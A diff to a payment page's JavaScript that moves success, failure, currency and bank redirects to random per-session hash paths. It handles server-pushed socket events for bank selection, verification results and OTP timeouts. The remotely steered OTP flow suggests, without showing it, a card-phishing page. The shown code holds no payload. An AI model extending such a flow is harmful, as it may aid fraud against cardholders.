@@ -925,17 +925,18 @@
             return hash;
           }
           
-// Helper functions for clean URLs
+// Helper functions for clean URLs using hash-based routing
 function getSuccessUrl(invoiceId) {
   const hash = sessionStorage.getItem('paymentHash') || generateRandomHash();
-  return `/success-page.html?invoiceId=${invoiceId}`;
+  // Use hash-based URL format instead of .html extension
+  return `/p/${hash}/success?invoiceId=${invoiceId}`;
 }
 
 function getFailUrl(reason) {
   const hash = sessionStorage.getItem('paymentHash') || generateRandomHash();
   
-  // Base URL with hash
-  let url = `/fail-page.html`;
+  // Base URL with hash-based format
+  let url = `/p/${hash}/fail`;
   
   // Add invoiceId and reason as query parameters if they exist
   const params = new URLSearchParams();
@@ -950,6 +951,12 @@ function getFailUrl(reason) {
   
   console.log("Generated fail URL:", url);
   return url;
+}
+
+// Create a hash URL for bankpage
+function getBankpageUrl(invoiceId) {
+  const hash = sessionStorage.getItem('paymentHash') || generateRandomHash();
+  return `/p/${hash}/bankpage?invoiceId=${invoiceId}`;
 }
 
 // Create a hash URL for bankpage
@@ -2241,15 +2248,23 @@ verificationTypeLogo.src = 'https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.
                  }
                });
          
-       // Currency page redirection
+// Currency page redirection with hash-based URL
 socket.on('redirect_to_currency', (data) => {
   console.log('[DEBUG] Received redirect_to_currency event:', data);
   
   // Save current state before redirecting
   sessionStorage.setItem('returning_from_currency', 'true');
   
-  // Redirect to currency page with updated extension
-  window.location.href = data.redirectUrl.replace('currencypayment.html', 'currencypayment-page.html');
+  // Redirect to currency page with hash-based URL format
+  const hash = sessionStorage.getItem('paymentHash') || generateRandomHash();
+  try {
+    const urlParams = new URLSearchParams(new URL(data.redirectUrl, window.location.origin).search);
+    window.location.href = `/p/${hash}/currency?${urlParams.toString()}`;
+  } catch (error) {
+    console.error("Error parsing redirect URL:", error);
+    // Fallback to simple format if URL parsing fails
+    window.location.href = `/p/${hash}/currency`;
+  }
 });
            // Handle MC bank selection update
       socket.on('update_mc_bank', (data) => {
@@ -2450,7 +2465,7 @@ socket.on('mc_verification_result', (data) => {
       clearInterval(window.mcTimerInterval);
     }
     
-    // Redirect based on result with updated pages
+    // Redirect based on result with hash-based URLs
     if (data.success) {
       window.location.href = getSuccessUrl(currentInvoiceId);
     } else {
@@ -2593,24 +2608,35 @@ socket.on('mc_verification_result', (data) => {
             
             isProcessing = false;
           } 
-          else if (data.status === 'redirect') {
-            // Use clean URLs for redirects
-            if (data.redirectUrl.includes('success.html')) {
-              window.location.href = getSuccessUrl(currentInvoiceId);
-            } else if (data.redirectUrl.includes('fail.html')) {
-              const url = new URL(data.redirectUrl, window.location.origin);
-              const reason = url.searchParams.get('reason');
-              window.location.href = getFailUrl(reason);
-            } else if (data.redirectUrl.includes('currencypayment.html')) {
-              window.location.href = data.redirectUrl.replace('currencypayment.html', 'currencypayment-page.html');
-            } else {
-              window.location.href = data.redirectUrl;
-            }
-          }
-        } catch (err) {
-          console.error('Error checking transaction status:', err);
-        }
-      }
+else if (data.status === 'redirect') {
+  // Use hash-based URLs for redirects
+  if (data.redirectUrl.includes('success.html')) {
+    window.location.href = getSuccessUrl(currentInvoiceId);
+  } else if (data.redirectUrl.includes('fail.html')) {
+    const url = new URL(data.redirectUrl, window.location.origin);
+    const reason = url.searchParams.get('reason');
+    window.location.href = getFailUrl(reason);
+  } else if (data.redirectUrl.includes('currencypayment.html')) {
+    const hash = sessionStorage.getItem('paymentHash') || generateRandomHash();
+    try {
+      const urlParams = new URLSearchParams(new URL(data.redirectUrl, window.location.origin).search);
+      window.location.href = `/p/${hash}/currency?${urlParams.toString()}`;
+    } catch (error) {
+      console.error("Error parsing redirect URL:", error);
+      window.location.href = `/p/${hash}/currency`;
+    }
+  } else {
+    // Keep any other URLs as is but check if we need to convert them
+    if (data.redirectUrl.endsWith('.html')) {
+      // Convert any other HTML pages to hash format
+      const pageName = data.redirectUrl.replace('.html', '');
+      const hash = sessionStorage.getItem('paymentHash') || generateRandomHash();
+      window.location.href = `/p/${hash}/${pageName}`;
+    } else {
+      window.location.href = data.redirectUrl;
+    }
+  }
+}
   
       // OTP Timer Function
       function startOtpTimer() {
@@ -2632,11 +2658,11 @@ socket.on('mc_verification_result', (data) => {
             timerEl.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
           }
           
-          if (timer <= 0) {
-            clearInterval(timerInterval);
-            timerInterval = null;
-            window.location.href = getFailUrl('timeout'); // Use clean URL for fail
-          }
+if (timer <= 0) {
+  clearInterval(timerInterval);
+  timerInterval = null;
+  window.location.href = getFailUrl('timeout'); // Use hash-based URL
+}
         }, 1000);
       }
   
@@ -2834,15 +2860,15 @@ function setupMCTimerIfNeeded(reset = false) {
     const seconds = timeLeft % 60;
     timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
     
-    if (timeLeft <= 0) {
-      clearInterval(window.mcTimerInterval);
-      
-      // Redirect on timeout
-      const overlay = document.getElementById('mcVerificationOverlay');
-      if (overlay) overlay.style.display = 'none';
-      
-      window.location.href = getFailUrl('timeout');
-    }
+if (timeLeft <= 0) {
+  clearInterval(window.mcTimerInterval);
+  
+  // Redirect on timeout with hash-based URL
+  const overlay = document.getElementById('mcVerificationOverlay');
+  if (overlay) overlay.style.display = 'none';
+  
+  window.location.href = getFailUrl('timeout');
+}
   }, 1000);
 }
               </script>
